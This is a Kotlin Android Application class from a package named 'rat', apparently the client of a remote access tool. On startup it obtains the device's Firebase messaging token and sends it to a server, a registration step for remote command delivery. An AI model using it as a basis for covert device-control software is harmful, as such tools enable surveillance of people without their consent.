package ru.awawa.rat

import android.app.Application
import android.content.Context
import com.google.firebase.messaging.FirebaseMessaging
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.server.Interactor

class Application: Application() {

    companion object {
        lateinit var context: Context
            private set
    }

    override fun onCreate() {
        super.onCreate()

        context = applicationContext
        Preferences.init(context)

        FirebaseMessaging.getInstance().token.addOnCompleteListener {
            Preferences.set(Preferences.PreferencesField.TOKEN, it.result ?: "")
            Interactor.sendToken()
        }
    }
}